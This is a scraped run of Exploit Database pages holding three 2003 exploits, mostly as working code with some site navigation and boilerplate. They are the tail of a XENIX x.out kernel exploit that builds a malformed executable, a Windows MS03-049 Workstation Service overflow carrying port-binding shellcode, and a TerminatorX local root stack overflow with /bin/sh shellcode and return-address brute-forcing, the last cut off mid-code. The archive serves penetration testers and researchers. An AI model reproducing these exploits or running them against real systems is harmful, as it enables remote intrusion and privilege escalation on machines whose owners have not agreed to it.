COFF_STYP_DATA 0x40#define COFF_STYP_BSS 0x80#define COFF_STYP_INFO 0x200#define COFF_STYP_OVER 0x400#define COFF_STYP_SHLIB 0x800/** COFF shared library header*/struct coff_slhdr {long entry_len; /* in words */long path_index; /* in words */char sl_name[1];};#define COFF_ROUND(val, by) (((val) + by - 1) & ~(by - 1))#define COFF_ALIGN(a) ((a) & ~(COFF_LDPGSZ - 1))#define COFF_HDR_SIZE \(sizeof(struct coff_filehdr) + sizeof(struct coff_aouthdr))#define COFF_BLOCK_ALIGN(ap, value) \(ap->a_magic == COFF_ZMAGIC ? COFF_ROUND(value, COFF_LDPGSZ) : \value)#define COFF_TXTOFF(fp, ap) \(ap->a_magic == COFF_ZMAGIC ? 0 : \COFF_ROUND(COFF_HDR_SIZE + fp->f_nscns * \sizeof(struct coff_scnhdr), COFF_SEGMENT_ALIGNMENT(ap)))#define COFF_DATOFF(fp, ap) \(COFF_BLOCK_ALIGN(ap, COFF_TXTOFF(fp, ap) + ap->a_tsize))#define COFF_SEGMENT_ALIGN(ap, value) \(COFF_ROUND(value, (ap->a_magic == COFF_ZMAGIC ? COFF_LDPGSZ : \COFF_SEGMENT_ALIGNMENT(ap))))#define COFF_LDPGSZ 4096#define COFF_SEGMENT_ALIGNMENT(ap) 4#define COFF_BADMAG(ex) (ex->f_magic != COFF_MAGIC_I386)#define IBCS2_HIGH_SYSCALL(n) (((n) & 0x7f) == 0x28)#define IBCS2_CVT_HIGH_SYSCALL(n) (((n) >> 8) + 128)struct exec_package;int exec_ibcs2_coff_makecmds(struct proc *, struct exec_package *);/** x.out (XENIX)*/struct xexec {u_short x_magic; /* magic number */u_short x_ext; /* size of extended header */long x_text; /* ignored */long x_data; /* ignored */long x_bss; /* ignored */long x_syms; /* ignored */long x_reloc; /* ignored */long x_entry; /* executable entry point */char x_cpu; /* processor type */char x_relsym; /* ignored */u_short x_renv; /* flags */};/* x_magic flags */#define XOUT_MAGIC 0x0206/* x_cpu flags */#define XC_386 0x004a /* 386, word-swapped *//* x_renv flags */#define XE_V5 0xc000#define XE_SEG 0x0800#define XE_ABS 0x0400#define XE_ITER 0x0200#define XE_VMOD 0x0100#define XE_FPH 0x0080#define XE_LTEXT 0x0040#define XE_LDATA 0x0020#define XE_OVER 0x0010#define XE_FS 0x0008#define XE_PURE 0x0004#define XE_SEP 0x0002#define XE_EXEC 0x0001/** x.out extended header*/struct xext {long xe_trsize; /* ignored */long xe_drsize; /* ignored */long xe_tbase; /* ignored */long xe_dbase; /* ignored */long xe_stksize; /* stack size if XE_FS set in x_renv */long xe_segpos; /* offset of segment table */long xe_segsize; /* segment table size */long xe_mdtpos; /* ignored */long xe_mdtsize; /* ignored */char xe_mdttype; /* ignored */char xe_pagesize; /* ignored */char xe_ostype; /* ignored */char xe_osvers; /* ignored */u_short xe_eseg; /* ignored */u_short xe_sres; /* ignored */};/** x.out segment table*/struct xseg {u_short xs_type; /* segment type */u_short xs_attr; /* attribute flags */u_short xs_seg; /* segment selector number */char xs_align; /* ignored */char xs_cres; /* ignored */long xs_filpos; /* offset of this segment */long xs_psize; /* physical segment size */long xs_vsize; /* virtual segment size */long xs_rbase; /* relocation base address */u_short xs_noff; /* ignored */u_short xs_sres; /* ignored */long xs_lres; /* ignored */};/* xs_type flags */#define XS_TNULL 0 /* unused */#define XS_TTEXT 1 /* text (read-only) */#define XS_TDATA 2 /* data (read-write) */#define XS_TSYMS 3 /* symbol table (noload) */#define XS_TREL 4 /* relocation segment (noload) */#define XS_TSESTR 5 /* string table (noload) */#define XS_TGRPS 6 /* group segment (noload) */#define XS_TIDATA 64#define XS_TTSS 65#define XS_TLFIX 66#define XS_TDNAME 67#define XS_TDTEXT 68#define XS_TDFIX 69#define XS_TOVTAB 70#define XS_T71 71#define XS_TSYSTR 72/* xs_attr flags */#define XS_AMEM 0x8000 /* memory image */#define XS_AITER 0x0001 /* iteration records */#define XS_AHUGE 0x0002 /* unused */#define XS_ABSS 0x0004 /* uninitialized data */#define XS_APURE 0x0008 /* read-only (sharable) segment */#define XS_AEDOWN 0x0010 /* expand down memory segment */#define XS_APRIV 0x0020 /* unused */#define XS_A32BIT 0x0040 /* 32-bit text/data *//** x.out iteration record*/struct xiter {long xi_size; /* text/data size */long xi_rep; /* number of replications */long xi_offset; /* offset within segment to replicated data */};#define XOUT_HDR_SIZE (sizeof(struct xexec) + sizeof(struct xext))int exec_ibcs2_xout_makecmds(struct proc *, struct exec_package *);#endif /* !_IBCS2_EXEC_H_ */int main(int ac,char **av){int fd;struct xexec xp;struct xext xep;char exe[10];char fil[]="./vvc";fd=open(fil,O_CREAT|O_RDWR,0700);if (fd==-1) {perror("open");return 1;}memset(&xp,0,sizeof(xp));memset(&xep,0,sizeof(xep));memset(exe,'v',sizeof(exe));xp.x_magic = XOUT_MAGIC;xp.x_cpu = XC_386;xp.x_renv = XE_EXEC;xp.x_ext = sizeof(xep);xep.xe_segsize = -1;write(fd,&xp,sizeof(xp));write(fd,&xep,sizeof(xep));write(fd,exe,sizeof(exe));printf("Now exec %s\n",fil);}// milw0rm.com [2003-11-07]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 119
Microsoft Windows XP/2000 - Workstation Service Overflow (MS03-049) - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft Windows XP/2000 - Workstation Service Overflow (MS03-049)EDB-ID:119CVE:2003-0812EDB Verified:Author:eEYeType:remoteExploit:/Platform:WindowsDate:2003-11-12Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*Proof of concept for MS03-049.This code was tested on a Win2K SP4 with FAT32 file system, and is supposedto work *only* with that (it will probably crash the the other 2Ks, no clueabout XPs).To be compiled with lcc-win32 (*hint* link mpr.lib) ... I will not improvethis public version, do not bother to ask.Credits go to eEyeSee original bulletin for more information, it is very well documented.*/#include <stdio.h>#include <win.h>#include <string.h>typedef int (*MYPROC)(LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, ULONG);#define SIZE 2048// PEX generated port binding shellcode (5555)unsigned char shellcode[] ="\x66\x81\xec\x04\x07" // sub sp, 704h"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x19\x5e\x31""\xc9\x81\xe9\xa6\xff\xff\xff\x81\x36\x76\xac\x7c\x25\x81\xee\xfc""\xff\xff\xff\xe2\xf2\xeb\x05\xe8\xe2\xff\xff\xff\x9e\x94\x7c\x25""\x76\xef\x31\x61\x76\x4b\x05\xe3\x0f\x49\x35\xa3\x3f\x08\xd1\x0b""\x9f\x08\x66\x55\xb1\x75\x75\xd0\xdb\x67\x91\xd9\x4d\x22\x32\x2b""\x9a\xd2\xa4\xc7\x05\x01\xa5\x20\xb8\xde\x82\x96\x60\xfb\x2f\x17""\x29\x9f\x4e\x0b\x32\xe0\x30\x25\x77\xf7\x28\xac\x93\x25\x21\x25""\x1c\x9c\x25\x41\xfd\xad\xf7\x65\x7a\x27\x0c\x39\xdb\x27\x24\x2d""\x9d\xa0\xf1\x72\x5a\xfd\x2e\xda\xa6\x25\xbf\x7c\x9d\xbc\x16\x2d""\x28\xad\x92\x4f\x7c\xf5\xf7\x58\x76\x2c\x85\x23\x02\x48\x2d\x76""\x89\x98\xf3\xcd\xe6\xac\x7c\x25\x2f\x25\x78\xab\x94\x47\x4d\xda""\x10\x2d\x90\xb5\x77\xf8\x14\x24\x77\xac\x7c\xda\x23\x8c\x2b\x72""\x21\xfb\x3b\x72\x31\xfb\x83\x70\x6a\x25\xbf\x14\x89\xfb\x2b\x4d""\x74\xac\x69\x96\xff\x4a\x16\x35\x20\xff\x83\x70\x6e\xfb\x2f\xda""\x23\xb8\x2b\x73\x25\x53\x29\x35\xff\x6e\x1a\xa4\x9a\xf8\x7c\xa8""\x4a\x88\x4d\xe5\x1c\xb9\x25\xd6\xdd\x25\xab\xe3\x32\x88\x6c\x61""\x88\xe8\x58\x18\xff\xd0\x58\x6d\xff\xd0\x58\x69\xff\xd0\x58\x75""\xfb\xe8\x58\x35\x22\xfc\x2d\x74\x27\xed\x2d\x6c\x27\xfd\x83\x50""\x76\xfd\x83\x70\x46\x25\x9d\x4d\x89\x53\x83\xda\x89\x9d\x83\x70""\x5a\xfb\x83\x70\x7a\x53\x29\x0d\x25\xf9\x2a\x72\xfd\xc0\x58\x3d""\xfd\xe9\x40\xae\x22\xa9\x04\x24\x9c\x27\x36\x3d\xfd\xf6\x5c\x24""\x9d\x4f\x4e\x6c\xfd\x98\xf7\x24\x98\x9d\x83\xd9\x47\x6c\xd0\x1d""\x96\xd8\x7b\xe4\xb9\xa1\x7d\xe2\x9d\x5e\x47\x59\x52\xb8\x09\xc4""\xfd\xf6\x58\x24\x9d\xca\xf7\x29\x3d\x27\x26\x39\x77\x47\xf7\x21""\xfd\xad\x94\xce\x74\x9d\xbc\xac\x9c\xf3\x22\x78\x2d\x6e\x74\x25";unsigned char jmp[] ="\xe9\x6f\xfd\xff\xff"; // jmp -290h to land in the payloadint main(void){int ret;HINSTANCE hInstance;MYPROC procAddress;char szBuffer[SIZE];NETRESOURCE netResource;netResource.lpLocalName = NULL;netResource.lpProvider = NULL;netResource.dwType = RESOURCETYPE_ANY;netResource.lpRemoteName = "\\\\192.168.175.3\\ipc$";ret = WNetAddConnection2(&netResource, "", "", 0); // attempt a null sessionif (ret != 0){fprintf(stderr, "[-] WNetAddConnection2 failed\n");return 1;}hInstance = LoadLibrary("netapi32");if (hInstance == NULL){fprintf(stderr, "[-] LoadLibrary failed\n");return 1;}procAddress = (MYPROC)GetProcAddress(hInstance, "NetValidateName"); // up to you tocheck NetAddAlternateComputerNameif (procAddress == NULL){fprintf(stderr, "[-] GetProcAddress failed\n");return 1;}memset(szBuffer, 0x90, sizeof(szBuffer));memcpy(&szBuffer[1400], shellcode, sizeof(shellcode) - 1);// ebp @ &szBuffer[2013]*(unsigned int *)(&szBuffer[2017]) = 0x74fdee63; // eip (jmp esp @ msafd.dll, useopcode search engine for more, but// be aware that a call esp willchange the offset in the stack)memcpy(&szBuffer[2021 + 12], jmp, sizeof(jmp)); // includes terminal NULL charret = (procAddress)(L"\\\\192.168.175.3", szBuffer, NULL, NULL, 0);WNetCancelConnection2("\\\\192.168.175.3\\ipc$", 0, TRUE);FreeLibrary(hInstance);return 0;}// milw0rm.com [2003-11-12]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 120
TerminatorX 3.81 - Local Stack Overflow / Local Privilege Escalation - Linux local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDTerminatorX 3.81 - Local Stack Overflow / Local Privilege EscalationEDB-ID:120CVE:EDB Verified:Author:Li0n7Type:localExploit:/Platform:LinuxDate:2003-11-13Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/* TerminatorX V. <= 3.81 local root exploit by Li0n7** Typical local stack-based overflow** Bugs discovered by c0wboy from 0x333** Contact Li0n7 voila fr** Usage: ./terminatorX-exp [-r <RET>][-b [-s <STARTING_RET>]]** -r <RET>: no bruteforcing, try to execute shellcode with <RET> as return address* -b: enables bruteforcing* -s: bruteforces by using return address from <STARTING_RET> to 0x00000000** Example:**root@li0n7:/tmp/test/exploits# ./terminatorX-exp -b** exploit: terminatorX V. <= 3.81 local root exploit by Li0n7* discoverer: c0wb0y (www.0x333.org)* visit us: http://www.ioc.fr.st* contact me: Li0n7[at]voila[dot]fr* usage: ./xterminator2 [-r <RET>][-b [-s <STARTING_RET>]]**[+] Starting bruteforcing...*[+] Testing 0xbffff734...*terminatorX Release 3.81 - Copyright (C) 1999-2003 by Alexander König*terminatorX comes with ABSOLUTELY NO WARRANTY - for details read the license.*...*[+] Testing 0xbffff66c...*terminatorX Release 3.81 - Copyright (C) 1999-2003 by Alexander König*terminatorX comes with ABSOLUTELY NO WARRANTY - for details read the license.*...*tX: err: Error parsing terminatorXrc.*tX: Failed loading terminatorXrc - trying to load old binary rc.*+ tX_warning: LADSPA_PATH not set. Trying /usr/lib/ladspa:/usr/local/lib/ladspa** tX_error: tX: Error: couldn't access directory "/usr/lib/ladspa".*+ tX_warning: Plugin "Sine Oscillator (Freq:audio, Amp:audio)" disabled. Not a 1-in/1-out plugin.*+ tX_warning: Plugin "Sine Oscillator (Freq:control, Amp:control)" disabled. Not a 1-in/1-out plugin.*+ tX_warning: Plugin "Stereo Amplifier" disabled. Not a 1-in/1-out plugin.*+ tX_warning: Plugin "White Noise Source" disabled. Not a 1-in/1-out plugin.*warning: failed to load external entity "%90%90...%90%901%C0Ph//shh/bin%...%BFl%F6%FF%BF"**(terminatorX:3085): WARNING **: Invalid UTF8 string passed to pango_layout_set_text()*sh-2.05b# exit *exit *[+] Exited: shell's ret code = 0*[+] Ret address found: 0xbffff66c**/#include <stdio.h>#include <stdlib.h>#include <unistd.h>#include <sys/wait.h>#include <sys/types.h>#include <errno.h>#define BSIZE 200#define D_START 0xbffff734#define PATH "/usr/local/bin/terminatorX"#define RET 0xbffff69echar shellcode[]= "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3""\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";char *buffer,*ptr;voidcheckme(char *buffer){if(!buffer){fprintf(stderr,"[-] Can't allocate memory,exiting...\n");exit(0);}return;}voidexec_vuln(){execl(PATH,PATH,"-f",buffer,NULL);}inttease(){pid_t pid;pid_t wpid;int status;pid = fork();if ( pid == -1 ) {fprintf(stderr, " [-] %s: Failed to fork()\n", strerror(errno));exit(13);} else if ( pid == 0 ) {exec_vuln();} else {wpid = wait(&status);if ( wpid == 